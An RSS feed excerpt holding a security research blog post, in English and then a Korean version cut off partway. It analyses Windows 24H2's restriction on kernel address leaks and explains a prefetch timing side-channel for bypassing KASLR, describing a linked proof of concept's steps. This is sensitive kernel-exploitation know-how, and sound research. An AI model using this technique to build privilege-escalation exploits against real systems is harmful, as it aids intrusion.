      <content:encoded><![CDATA[<p>Bypassing Windows Kernel Mitigations: Part0 - Deep Dive into KASLR Leaks Restriction (Ko) &#x2190; Now</p><p><a href="https://hackyboiz.github.io/2024/12/08/l0ch/bypassing-kernel-mitigation-part1/eo/">Bypassing Windows Kernel Mitigations: Part1 - Overview</a></p><p><a href="https://hackyboiz.github.io/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/eo/">Bypassing Windows Kernel Mitigations: Part2 - CVE-2024-21338</a> </p><hr><p>Hello, this is L0ch!<br>Originally, I was planning to write a post on the I/O Ring exploit, but I ended up diving deeper into a topic from Part 1 and decided to create this as a kind of side story. That&#x2019;s why I&#x2019;ve numbered this part as 0 &#x1F604;</p><p>In this post, we&#x2019;ll take a closer look at the new KASLR-related mitigation introduced in Windows 11 and Windows Server 24H2, and explore a novel method for bypassing it.</p><blockquote><p>Before we begin, I highly recommend reading the <a href="https://hackyboiz.github.io/2024/12/08/l0ch/bypassing-kernel-mitigation-part1/ko/#kASLR-Kernel-Address-Layout-Rnadomization">Windows Kernel Mitigation Part 1</a>, especially the section on kASLR (Kernel Address Space Layout Randomization).</p></blockquote><h2 id="KASLR-Bypass"><a href="#KASLR-Bypass" class="headerlink" title="KASLR Bypass"></a>KASLR Bypass</h2><p>Prior to version 24H2, it was possible to call <code>NtQuerySystemInformation</code> from a process running at Medium Integrity Level and obtain various kernel object addresses, including the image base of <code>ntoskrnl.exe</code>&#x2014;all at once. These details were highly useful for kernel exploitation.</p><p><img src="image.png" alt="image.png"><img src="image1.png" alt="image1.png"></p><p>By leveraging these leaked addresses, an attacker could locate gadgets in <code>ntoskrnl.exe</code>, tamper with fields like <code>PreviousMode</code> or <code>SeDebugPrivilege</code>, and so on.</p><hr><h2 id="Analysis-of-KASLR-Mitigation-in-24H2"><a href="#Analysis-of-KASLR-Mitigation-in-24H2" class="headerlink" title="Analysis of KASLR Mitigation in 24H2"></a><strong>Analysis of KASLR Mitigation in 24H2</strong></h2><p>To utilize <code>NtQuerySystemInformation</code>, one would typically load <code>ntdll.dll</code>, retrieve the address of the function using <code>GetProcAddress</code>, and then invoke it. The actual implementation follows this call chain:</p><ol><li><code>(ntdll) NtQuerySystemInformation</code>  </li><li><code>(ntoskrnl) NtQuerySystemInformation(EX)</code>  </li><li><code>(ntoskrnl) ExpQuerySystemInformation</code>  </li></ol><p><img src="image2.png" alt="image2.png"><img src="image3.png" alt="image3.png"></p><p>Ultimately, the <code>ExpQuerySystemInformation</code> function receives an enumeration value that determines which internal subroutine is executed to return the requested system information.</p><p><img src="image4.png" alt="image4.png"></p><p>When examining the xrefs of these subroutines, many of those that deal with kernel-related information invoke the <code>ExIsRestrictedCaller</code> function.</p><p><img src="image5.png" alt="image5.png"></p><p>Let&#x2019;s look into <code>ExIsRestrictedCaller</code>. We can see a call to <code>Feature_RestrictKernelAddressLeaks_private_IsEnabledDeviceUsageNoInline()</code>, which is a new feature flag introduced in 24H2. If this flag returns true, the function checks whether the caller possesses <code>SeDebugPrivilege</code> via a call to <code>SeSinglePrivilegeCheck(SeDebugPrivilege, a1)</code>. If the privilege is absent, <code>ExIsRestrictedCaller</code> returns true, indicating that the caller is restricted.</p><p><img src="image6.png" alt="image6.png"></p><p>The code snippet below shows a subroutine invoked when the enumeration value is <code>SystemModuleInformation</code>. If <code>ExIsRestrictedCaller</code> returns true, the subroutine skips the call to <code>ExQueryModuleInformation</code> and returns an error instead.</p><p><img src="image7.png" alt="image7.png"></p><p>As a result, processes running at Medium Integrity Level without <code>SeDebugPrivilege</code> can no longer retrieve any meaningful results using <code>NtQuerySystemInformation</code> to leak kernel addresses.</p><p>At this point, one might wonder: <em>Do we now need to find additional infoleaks when developing LPE exploits for Windows?</em> Fortunately, there&#x2019;s still a viable sidechannel-based bypass.</p><h2 id="EntryBleed-CVE-2022-4543-and-Prefetch-Sidechannel"><a href="#EntryBleed-CVE-2022-4543-and-Prefetch-Sidechannel" class="headerlink" title="EntryBleed (CVE-2022-4543) and Prefetch Sidechannel"></a>EntryBleed (CVE-2022-4543) and Prefetch Sidechannel</h2><p>Before diving into the bypass, we need to understand the KPTI (Kernel Page Table Isolation) protection used in Linux and the EntryBleed vulnerability (CVE-2022-4543).</p><p>KPTI removes most kernel memory mappings from user-mode page tables, only retaining minimal virtual kernel memory required for exception/signal/syscall handling. This prevents user-mode from learning kernel address mappings.</p><p>This was introduced in response to the infamous Meltdown and Spectre attacks disclosed in 2018. Since those vulnerabilities rendered KASLR ineffective, OS vendors adopted stricter memory isolation at the page table level.</p><blockquote><p>Fun fact: back then, there was widespread concern that CPU vendors would go under. And well&#x2026; Intel&#x2019;s current trajectory isn&#x2019;t looking so great either. &#x1F605;  </p></blockquote><p><img src="image8.png" alt="image8.png">  </p><blockquote><p>With KPTI enabled, only minimal kernel mappings (e.g., for syscalls and interrupts) remain in the user address space.<br>Source: <a href="https://en.wikipedia.org/wiki/Kernel_page-table_isolation">https://en.wikipedia.org/wiki/Kernel_page-table_isolation</a></p></blockquote><p>The EntryBleed vulnerability leverages a prefetch sidechannel to identify syscall handler addresses residing in the user-mode page tables, thus bypassing KPTI.</p><p>Even with KPTI enabled, the kernel&#x2019;s <code>entry_SYSCALL_64</code> address (used during 64-bit syscall transitions) remains mapped. The attack uses this fact to infer kernel base addresses.</p><p>x86_64 architecture features a TLB (Translation Lookaside Buffer) to cache recent virtual-to-physical address translations, and supports prefetch instructions that load data into the CPU cache.</p><p>When a prefetch instruction targets an address already present in the TLB, it skips the page walk and executes faster.</p><p><img src="image9.png" alt="image9.png">  </p><blockquote><p>Execution time differences depending on whether the page is cached<br>Source: <a href="https://gruss.cc/files/prefetch.pdf">https://gruss.cc/files/prefetch.pdf</a></p></blockquote><p>This timing difference can be exploited as follows:</p><ol><li>Repeatedly invoke a syscall to ensure <code>entry_SYSCALL_64</code> is cached in the TLB.</li><li>Iteratively execute prefetch instructions over the potential kernel address range:<ul><li><code>0xffffffff80000000 - 0xffffffffc0000000</code></li></ul></li><li>If execution is slow &#x2192; address likely not cached &#x2192; continue scanning.</li><li>If execution is fast &#x2192; cached <code>entry_SYSCALL_64</code> hit &#x2192; compute the kernel base via known offset.</li></ol><p><img src="image10.png" alt="image10.png">  </p><blockquote><p>Using timing differences of prefetch instructions to leak kernel addresses<br>Source: <a href="https://gruss.cc/files/prefetch.pdf">https://gruss.cc/files/prefetch.pdf</a></p></blockquote><h3 id="Bypassing-KASLR-Mitigation-in-24H2"><a href="#Bypassing-KASLR-Mitigation-in-24H2" class="headerlink" title="Bypassing KASLR Mitigation in 24H2"></a>Bypassing KASLR Mitigation in 24H2</h3><p>The same prefetch-based sidechannel technique from EntryBleed is also applicable to Windows!</p><p>Windows has a similar KPTI-inspired mitigation called <strong>KVA (Kernel Virtual Address) Shadowing</strong>. This was Microsoft&#x2019;s response to Meltdown/Spectre, implementing kernel/user address space separation at the software level. However, recent Windows builds have KVA Shadowing disabled by default.</p><p><img src="image11.png" alt="image11.png"></p><p>We can tell it&#x2019;s disabled because <code>KPROCESS.UserDirectoryTableBase</code> contains a null value, which would otherwise point to a valid address if KVAS were active. Since modern CPUs are generally immune to Meltdown/Spectre, Microsoft likely chose to disable KVAS by default to avoid performance degradation.</p><p>This means: <strong>kernel addresses are still mapped in the user-mode page table</strong>&#x2014;and thus, prefetch-based leaks are feasible.</p><p>Let&#x2019;s analyze the sidechannel procedure from a PoC shared by exploits-forsale.</p><p><img src="image12.png" alt="image12.png">  </p><blockquote><p>Source: <a href="https://github.com/exploits-forsale/prefetch-tool/blob/main/prefetch_tool/prefetch_asm.asm">https://github.com/exploits-forsale/prefetch-tool/blob/main/prefetch_tool/prefetch_asm.asm</a></p></blockquote><ul><li><strong>Orange box</strong>: Accepts the first prefetch target address in <code>rcx</code>.</li><li><strong>Red box</strong>: Uses <code>prefetchnta</code> to specify non-temporal prefetching and <code>prefetcht2</code> to load the operand into the L2 cache. Measures execution time to infer TLB caching.</li><li><strong>Blue box</strong>: Uses <code>lfence</code> and <code>mfence</code> for instruction serialization to ensure accurate timing.<ul><li>Execute all previously loaded instructions in memory and enter</li><li>Force instruction execution order, remove optimization</li></ul></li></ul><p><img src="image13.png" alt="image13.png"></p><p>On my test environment (13th-gen Intel CPU), I was able to resolve the <code>ntoskrnl.exe</code> base address within a few seconds.</p><p>There are, however, two major caveats:</p><ol><li>This technique is reliable only on recent Intel processors. On AMD CPUs, results are inconsistent.</li><li>Unlike the legacy <code>NtQuerySystemInformation</code> method, which could reveal addresses of various kernel objects (e.g., KTHREAD, pools), this approach only leaks the kernel image base&#x2014;making it comparatively less versatile.</li></ol><p>Ultimately, the permission restrictions added to <code>NtQuerySystemInformation</code> in 24H2 have a significant impact on kernel exploitation strategies.<br><del>Looks like understanding the CPU manual is now a prerequisite for kernel work&#x2026;</del></p><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>In this post, we examined the mitigation patch applied to <code>NtQuerySystemInformation</code>, a long-time staple in Windows kernel exploitation. We also explored how this led to the need for new KASLR bypass techniques, specifically through sidechannel-based kernel infoleaks.</p><p>In my opinion, the availability of <code>NtQuerySystemInformation</code> had previously stifled research into novel KASLR bypasses. With the new 24H2 mitigation in place, we may finally see a renewed wave of creative approaches in the kernel exploitation space.</p><p>See you in the next post&#x2014;where we&#x2019;ll return to the I/O Ring exploit!</p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a href="https://windows-internals.com/kaslr-leaks-restriction/">https://windows-internals.com/kaslr-leaks-restriction/</a></p><p><a href="https://exploits.forsale/24h2-nt-exploit/">https://exploits.forsale/24h2-nt-exploit/</a></p><p><a href="https://github.com/exploits-forsale/prefetch-tool">https://github.com/exploits-forsale/prefetch-tool</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/kernel/">kernel</category>
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/bypass/">bypass</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/mitigation/">mitigation</category>
      
      <category domain="https://hackyboiz.github.io/tags/kaslr/">kaslr</category>
      
      <category domain="https://hackyboiz.github.io/tags/entrybleed/">entrybleed</category>
      
      
      <comments>https://hackyboiz.github.io/2025/04/13/l0ch/bypassing-kernel-mitigation-part0/en/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Bypassing Windows Kernel Mitigations: Part0 - Deep Dive into KASLR Leaks Restriction (Ko)</title>
      <link>https://hackyboiz.github.io/2025/04/13/l0ch/bypassing-kernel-mitigation-part0/ko/</link>
      <guid>https://hackyboiz.github.io/2025/04/13/l0ch/bypassing-kernel-mitigation-part0/ko/</guid>
      <pubDate>Sun, 13 Apr 2025 10:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;Bypassing Windows Kernel Mitigations: Part0 - Deep Dive into KASLR Leaks Restriction (Ko) &amp;#x2190; Now&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://hackyboiz.</description>
        
      
      
      
      <content:encoded><![CDATA[<p>Bypassing Windows Kernel Mitigations: Part0 - Deep Dive into KASLR Leaks Restriction (Ko) &#x2190; Now</p><p><a href="https://hackyboiz.github.io/2024/12/08/l0ch/bypassing-kernel-mitigation-part1/ko/">Bypassing Windows Kernel Mitigations: Part1 - Overview</a></p><p><a href="https://hackyboiz.github.io/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/ko/">Bypassing Windows Kernel Mitigations: Part2 - CVE-2024-21338</a> </p><hr><p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;, L0ch&#xC785;&#xB2C8;&#xB2E4;! &#xC0AC;&#xC2E4; &#xC6D0;&#xB798; &#xACC4;&#xD68D;&#xC740; I/O Ring exploit&#xC5D0; &#xB300;&#xD574; &#xC815;&#xB9AC;&#xD558;&#xB824;&#xACE0; &#xD588;&#xB294;&#xB370;, &#xD30C;&#xD2B8; 1&#xC5D0;&#xC11C; &#xC18C;&#xAC1C;&#xD55C; &#xB0B4;&#xC6A9; &#xC911; &#xB354; &#xAE4A;&#xAC8C; &#xD30C;&#xACE0;&#xB4E4;&#xB9CC;&#xD55C; &#xC8FC;&#xC81C;&#xB97C; &#xC678;&#xC804;&#xACA9;&#xC73C;&#xB85C; &#xC4F0;&#xAC8C; &#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4; &#x314E;&#x314E; &#xADF8;&#xB798;&#xC11C; &#xD30C;&#xD2B8; &#xB118;&#xBC84;&#xB9C1;&#xB3C4; 0&#xC73C;&#xB85C; &#xC815;&#xD588;&#xAD6C;&#xC694;</p><p>&#xC774;&#xBC88; &#xAE00;&#xC5D0;&#xC11C;&#xB294; Windows 11&#xACFC; Windows Server 24H2&#xBD80;&#xD130; &#xCD94;&#xAC00;&#xB41C; KASLR &#xAD00;&#xB828; mitigation &#xD328;&#xCE58;&#xAC00; &#xC5B4;&#xB5BB;&#xAC8C; &#xC774;&#xB8E8;&#xC5B4;&#xC84C;&#xB098; &#xC880; &#xB354; &#xC790;&#xC138;&#xD788; &#xC0B4;&#xD3B4;&#xBCF4;&#xACE0; &#xB610; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xB294; &#xC0C8;&#xB85C;&#xC6B4; &#xBC29;&#xBC95;&#xC5D0; &#xB300;&#xD574; &#xC54C;&#xC544;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p><blockquote><p>&#xC7A0;&#xAE50;, &#xADF8; &#xC804;&#xC5D0; <a href="https://hackyboiz.github.io/2024/12/08/l0ch/bypassing-kernel-mitigation-part1/ko/#kASLR-Kernel-Address-Layout-Rnadomization">Windows Kernel Mitigation &#xD30C;&#xD2B8; 1</a>&#xC758; kASLR(Kernel Address Layout Rnadomization) &#xD30C;&#xD2B8;&#xB97C; &#xBA3C;&#xC800; &#xC77D;&#xC73C;&#xBA74; &#xB354; &#xC88B;&#xC544;&#xC694;</p></blockquote><h2 id="KASLR-bypass"><a href="#KASLR-bypass" class="headerlink" title="KASLR bypass"></a>KASLR bypass</h2><p>24H2 &#xC774;&#xC804;, &#xAE30;&#xC874;&#xC5D0;&#xB294; Medium Integrity Level &#xAD8C;&#xD55C;&#xC73C;&#xB85C; <code>NtQuerySystemInformation</code>&#xC744; &#xD638;&#xCD9C;&#xD558;&#xBA74; &#xC544;&#xB798;&#xCC98;&#xB7FC; &#xCEE4;&#xB110;&#xC758; &#xC5EC;&#xB7EC; &#xC624;&#xBE0C;&#xC81D;&#xD2B8; &#xC8FC;&#xC18C;, <code>ntoskrnl.exe</code> &#xC774;&#xBBF8;&#xC9C0; &#xBCA0;&#xC774;&#xC2A4;&#xC8FC;&#xC18C; &#xB4F1; &#xCEE4;&#xB110; exploit&#xC5D0; &#xD544;&#xC694;&#xD55C; &#xC720;&#xC6A9;&#xD55C; &#xC815;&#xBCF4;&#xB4E4;&#xC744; &#xD55C;&#xBC29;&#xC5D0; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="image.png" alt="image.png"><img src="image1.png" alt="image1.png"></p><p>&#xC774;&#xB807;&#xAC8C; leak&#xD55C; &#xC8FC;&#xC18C;&#xB4E4;&#xC744; &#xC774;&#xC6A9;&#xD574; <code>PreviousMode</code>, <code>SeDebugPrivilege</code> &#xD544;&#xB4DC;&#xB97C; &#xBCC0;&#xC870;&#xD558;&#xAC70;&#xB098; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC5D0; &#xD544;&#xC694;&#xD55C; <code>ntoskrnl.exe</code>&#xC758; gadget&#xC744; &#xAD6C;&#xD558;&#xB294; &#xB4F1; &#xC720;&#xC6A9;&#xD558;&#xAC8C; &#xD65C;&#xC6A9; &#xAC00;&#xB2A5;&#xD588;&#xC5C8;&#xC8E0;.</p><h2 id="Analysis-of-KASLR-Mitigation-in-24H2"><a href="#Analysis-of-KASLR-Mitigation-in-24H2" class="headerlink" title="Analysis of KASLR Mitigation in 24H2"></a><strong>Analysis of KASLR Mitigation in 24H2</strong></h2><p><code>NtQuerySystemInformation</code> &#xD568;&#xC218;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; &#xD574;&#xB2F9; &#xD568;&#xC218;&#xB97C; export&#xD558;&#xB294; <code>ntdll.dll</code>&#xC744; &#xB85C;&#xB4DC;&#xD558;&#xACE0;, <code>GetProcAddress</code>&#xB85C; &#xC8FC;&#xC18C;&#xB97C; &#xAD6C;&#xD55C; &#xB4A4; &#xD638;&#xCD9C;&#xD574;&#xC57C; &#xD558;&#xB294;&#xB370;&#xC694;. </p><p>&#xC2E4;&#xC9C8;&#xC801;&#xC778; &#xAE30;&#xB2A5;&#xC740; </p><ol><li><code>(ntdll) NtQuerySystemInformation</code></li><li><code>(ntoskrnl) NtQuerySystemInformation(EX)</code></li><li><code>(ntoskrnl) ExpQuerySytemInformation</code> </li></ol><p>&#xD638;&#xCD9C; &#xCCB4;&#xC778;&#xC744; &#xAC70;&#xCCD0; <code>ExpQuerySytemInformation</code> &#xD568;&#xC218;&#xC5D0; &#xAD6C;&#xD604;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="image2.png" alt="image2.png"><img src="image3.png" alt="image3.png"></p><p>&#xCD5C;&#xC885;&#xC801;&#xC73C;&#xB85C; ExpQuerySytemInformation &#xD568;&#xC218;&#xC5D0; &#xC804;&#xB2EC;&#xB418;&#xB294; &#xC5F4;&#xAC70;&#xD615; &#xAC12;&#xC5D0; &#xB530;&#xB77C; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xC11C;&#xBE0C;&#xB8E8;&#xD2F4;&#xB4E4;&#xC5D0;&#xC11C; &#xC801;&#xC808;&#xD55C; &#xC2DC;&#xC2A4;&#xD15C; &#xC815;&#xBCF4;&#xB97C; &#xBC18;&#xD658;&#xD558;&#xC8E0;.<br><img src="image4.png" alt="image4.png"></p><p>&#xC774; &#xB54C; &#xCEE4;&#xB110;&#xACFC; &#xAD00;&#xB828;&#xB41C; &#xC815;&#xBCF4;&#xB97C; &#xBC18;&#xD658;&#xD558;&#xB294; &#xB9CE;&#xC740; &#xC11C;&#xBE0C;&#xB8E8;&#xD2F4;&#xC5D0;&#xC11C; ExIsRestrictedCaller &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294; &#xAC83;&#xC744; xrefs viewer&#xB85C; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.<br><img src="image5.png" alt="image5.png"></p><p><code>ExIsRestrictedCaller</code> &#xD568;&#xC218;&#xB97C; &#xC0B4;&#xD3B4;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. <code>Feature_RestrictKernelAddressLeaks_private_IsEnabeldDeviceUsageNoInline()</code> &#xAC00; &#xBCF4;&#xC774;&#xB294;&#xB370;, &#xD574;&#xB2F9; &#xD568;&#xC218;&#xAC00; &#xBC14;&#xB85C; 24H2&#xBD80;&#xD130; &#xC0C8;&#xB85C; &#xCD94;&#xAC00;&#xB41C; Feature flag&#xC785;&#xB2C8;&#xB2E4;. </p><p>&#xD574;&#xB2F9; flag&#xAC00; &#xD65C;&#xC131;&#xD654;&#xB418;&#xC5B4; true&#xB97C; &#xBC18;&#xD658;&#xD558;&#xBA74;, <code>SeSinglePrivilegeCheck(SeDebugPrivilege, a1)</code> &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xD638;&#xCD9C;&#xC790; &#xAD8C;&#xD55C;&#xC5D0; <code>SeDebugPrivilege</code> &#xAD8C;&#xD55C;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xB294;&#xC9C0;&#xB97C; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;. &#xB9CC;&#xC57D; &#xAD8C;&#xD55C;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xC9C0; &#xC54A;&#xC73C;&#xBA74; <code>ExIsRestrictedCaller</code> &#xD568;&#xC218;&#xB294; true&#xB97C; &#xBC18;&#xD658;&#xD574; &#xC81C;&#xD55C;&#xB41C; &#xAD8C;&#xD55C;&#xC758; Caller&#xC784;&#xC744; &#xC54C;&#xB9AC;&#xC8E0;.<br><img src="image6.png" alt="image6.png"></p><p>&#xC704; &#xCF54;&#xB4DC; &#xC2A4;&#xB2C8;&#xD3AB;&#xC740; SystemModuleInformation &#xC5F4;&#xAC70;&#xD615; &#xAC12;&#xC744; &#xC804;&#xB2EC;&#xD588;&#xC744; &#xB54C; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xC11C;&#xBE0C;&#xB8E8;&#xD2F4;&#xC778;&#xB370;&#xC694;,  ExIsREstrictedCaller &#xD568;&#xC218; &#xD638;&#xCD9C;&#xC758; &#xBC18;&#xD658;&#xAC12;&#xC744; &#xD655;&#xC778;&#xD558;&#xACE0; &#xC81C;&#xD55C;&#xB41C; &#xAD8C;&#xD55C;&#xC758; Caller&#xC784;&#xC774; &#xD655;&#xC778;&#xB418;&#xBA74; ExQueryModuleInformation&#xC73C;&#xB85C; &#xCEE4;&#xB110; &#xBAA8;&#xB4C8; &#xC815;&#xBCF4;&#xB97C; &#xAD6C;&#xD558;&#xC9C0; &#xC54A;&#xACE0; Error &#xCF54;&#xB4DC;&#xB97C; &#xBC18;&#xD658;&#xD569;&#xB2C8;&#xB2E4;.<br><img src="image7.png" alt="image7.png"></p><p>&#xACB0;&#xAD6D; <code>SeDebugPrivilege</code> &#xAD8C;&#xD55C;&#xC774; &#xC5C6;&#xB294; Medium Integrity Level &#xC720;&#xC800;&#xB294; &#xAE30;&#xC874;&#xC758; <code>NtQuerySystemInformation</code> &#xB97C; &#xC0AC;&#xC6A9;&#xD55C; Leak &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD574;&#xB3C4; &#xC544;&#xBB34;&#xB7F0; &#xBC18;&#xD658; &#xACB0;&#xACFC;&#xB3C4; &#xC5BB;&#xC744; &#xC218; &#xC5C6;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xC81C; Windows&#xC5D0;&#xC11C; LPE &#xC775;&#xC2A4;&#xD560; &#xB54C; &#xCEE4;&#xB110;&#xC8FC;&#xC18C; leak &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCD94;&#xAC00;&#xB85C; &#xCC3E;&#xC544;&#xC57C; &#xB418;&#xB294;&#xAC74;&#xAC00;..? &#xC2F6;&#xC9C0;&#xB9CC; &#xC81C;&#xD55C;&#xC801;&#xC73C;&#xB85C; KASLR&#xC744; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xB294; &#xBC29;&#xBC95;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;</p><h2 id="EntryBleed-CVE-2022-4543-and-prefetch-sidechannel"><a href="#EntryBleed-CVE-2022-4543-and-prefetch-sidechannel" class="headerlink" title="EntryBleed(CVE-2022-4543) and prefetch sidechannel"></a>EntryBleed(CVE-2022-4543) and prefetch sidechannel</h2><p>&#xADF8; &#xC804;&#xC5D0; &#xBA3C;&#xC800;, Linux&#xC758; KPTI(Kernel Page Table Isolation) &#xBCF4;&#xD638;&#xAE30;&#xBC95;&#xACFC; <strong>EntryBleed(CVE-2022-4543</strong>)&#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xB300;&#xD574; &#xC54C;&#xC544;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p><p>KPTI&#xB294; &#xC720;&#xC800;&#xBAA8;&#xB4DC; &#xD398;&#xC774;&#xC9C0; &#xD14C;&#xC774;&#xBE14;&#xC5D0; &#xBAA8;&#xB4E0; &#xCEE4;&#xB110; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xC81C;&#xAC70;&#xD558;&#xB294; &#xBCF4;&#xD638;&#xAE30;&#xBC95;&#xC778;&#xB370;&#xC694;, exception&#xC774;&#xB098; syscall &#xD578;&#xB4E4;&#xB7EC; &#xB4F1; &#xC720;&#xC800;&#xBAA8;&#xB4DC;&#xC5D0;&#xC11C; &#xCEE4;&#xB110;&#xB85C; &#xC804;&#xD658;&#xD560; &#xB54C; &#xD544;&#xC694;&#xD55C; &#xCD5C;&#xC18C;&#xD55C;&#xC758; &#xCEE4;&#xB110; &#xAC00;&#xC0C1; &#xBA54;&#xBAA8;&#xB9AC;&#xB9CC; &#xB9E4;&#xD551;&#xB418;&#xB3C4;&#xB85D; &#xC720;&#xC9C0;&#xD574; &#xC720;&#xC800;&#xBAA8;&#xB4DC;&#xC640; &#xCEE4;&#xB110;&#xBAA8;&#xB4DC;&#xC758; &#xD398;&#xC774;&#xC9C0; &#xD14C;&#xC774;&#xBE14;&#xC744; &#xACA9;&#xB9AC;&#xD558;&#xACE0; &#xC720;&#xC800;&#xAC00; &#xCEE4;&#xB110;&#xC758; &#xD2B9;&#xC815; &#xC8FC;&#xC18C;&#xB97C; &#xC54C;&#xC544;&#xB0BC; &#xC218; &#xC5C6;&#xB3C4;&#xB85D; &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB7F0; KPTI &#xB4F1;&#xC7A5;&#xD55C; &#xC774;&#xC720;&#xB294; &#xBC14;&#xB85C; 2018&#xB144;&#xC5D0; &#xBC1C;&#xD45C;&#xB41C; &#xADF8; &#xC720;&#xBA85;&#xD55C; Meltdown&#xACFC; Spectre &#xB54C;&#xBB38;&#xC774;&#xC8E0;. &#xD504;&#xB85C;&#xC138;&#xC11C; &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C; &#xC778;&#xD574; KASLR&#xC774; &#xBB34;&#xC6A9;&#xC9C0;&#xBB3C;&#xC774; &#xB418;&#xC790; OS &#xB808;&#xBCA8;&#xC5D0;&#xC11C; &#xC720;&#xC800;&#xBAA8;&#xB4DC; &#xD398;&#xC774;&#xC9C0;&#xC5D0; &#xB9E4;&#xD551;&#xB418;&#xB294; &#xCEE4;&#xB110; &#xC8FC;&#xC18C;&#xB97C; &#xB300;&#xBD80;&#xBD84; &#xC81C;&#xAC70;&#xD574; &#xC601;&#xD5A5;&#xC744; &#xCD5C;&#xC18C;&#xD654;&#xD558;&#xB824;&#xB294; &#xBAA9;&#xC801;&#xC774;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xC5EC;&#xB2F4;&#xC73C;&#xB85C; &#xADF8;&#xB54C; CPU &#xC81C;&#xC870;&#xC5C5;&#xCCB4;&#xB4E4;&#xC774; &#xB9DD;&#xD55C;&#xB2E4; &#xC5B4;&#xCA50;&#xB2E4; &#xD558;&#xB294; &#xC598;&#xAE30;&#xAC00; &#xC5C4;&#xCCAD; &#xB9CE;&#xC558;&#xC5C8;&#xC8E0;&#x314B;&#x314B;&#x314B; <del>&#xC778;&#xD154;&#xC740; &#xC9C0;&#xAE08; &#xC9C4;&#xC9DC; &#xB9DD;&#xD574;&#xAC00;&#xACE0; &#xC788;&#xC9C0;&#xB9CC;</del><br><img src="image8.png" alt="image8.png"></p><blockquote><p>KPTI&#xAC00; &#xC801;&#xC6A9;&#xB418;&#xBA74; &#xC720;&#xC800;&#xBAA8;&#xB4DC; &#xD398;&#xC774;&#xC9C0;&#xC5D0;&#xB294; syscall&#xACFC; interrupt &#xB4F1;&#xC5D0; &#xD544;&#xC694;&#xD55C; &#xCD5C;&#xC18C;&#xD55C;&#xC758; &#xCEE4;&#xB110; &#xC8FC;&#xC18C;&#xB9CC; &#xB0A8;&#xC74C;<br>&#xCD9C;&#xCC98; : <a href="https://en.wikipedia.org/wiki/Kernel_page-table_isolation">https://en.wikipedia.org/wiki/Kernel_page-table_isolation</a></p></blockquote><p>CVE-2022-4543&#xC740; prefetch sidechannel &#xAE30;&#xBC95;&#xC744; &#xC774;&#xC6A9;&#xD574; &#xC720;&#xC800;&#xBAA8;&#xB4DC; &#xD398;&#xC774;&#xC9C0;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; syscall &#xD578;&#xB4E4;&#xB7EC; &#xC8FC;&#xC18C;&#xB97C; &#xCC3E;&#xACE0; KPTI &#xBCF4;&#xD638;&#xAE30;&#xBC95;&#xC744; &#xC6B0;&#xD68C;&#xD558;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC778;&#xB370;&#xC694;, &#xCEE4;&#xB110;&#xC758; <code>syscall_init</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; <code>entry_SYSCALL_64</code> &#xD568;&#xC218; &#xC8FC;&#xC18C;&#xB294; 64&#xBE44;&#xD2B8; syscall&#xC774; &#xD638;&#xCD9C;&#xB420; &#xB54C; handler&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;. </p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; <code>entry_SYSCALL_64</code>&#xAC00; &#xC720;&#xC800;&#xBAA8;&#xB4DC;-&#xCEE4;&#xB110;&#xBAA8;&#xB4DC; &#xC804;&#xD658;&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xBBC0;&#xB85C; KPTI&#xAC00; &#xD65C;&#xC131;&#xD654;&#xB418;&#xB354;&#xB77C;&#xB3C4; &#xC720;&#xC800;&#xBAA8;&#xB4DC; &#xD398;&#xC774;&#xC9C0;&#xC5D0; &#xB9E4;&#xD551;&#xB418;&#xB294; 